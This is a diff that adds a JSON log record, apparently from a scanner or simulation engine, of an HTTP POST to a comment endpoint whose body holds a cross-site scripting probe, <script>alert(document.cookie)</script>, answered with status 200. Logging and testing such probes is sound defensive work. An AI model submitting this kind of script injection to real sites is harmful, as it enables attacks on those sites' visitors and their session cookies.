@@ -1,0 +1,15 @@
+{
+  "request": {
+    "url": "engine_simulation",
+    "full_http_request": "POST /api/comment HTTP/1.1\nHost:  www.example.com \nContent-Type: application/x-www-form-urlencoded\nContent-Length: 68\n\ncontent=<script>alert(document.cookie)</script>&article_id=5"
+  },
+  "response": {
+    "statusCode": 200,
+    "httpResponseContent": ""
+  },
+  "meta": {
+    "isPipeline": false
+  },
+  "recordId": "f72f3a1ff5de4be884910563e793b7c7",
+  "timestamp": "2026-01-06 21:10:25"
+}
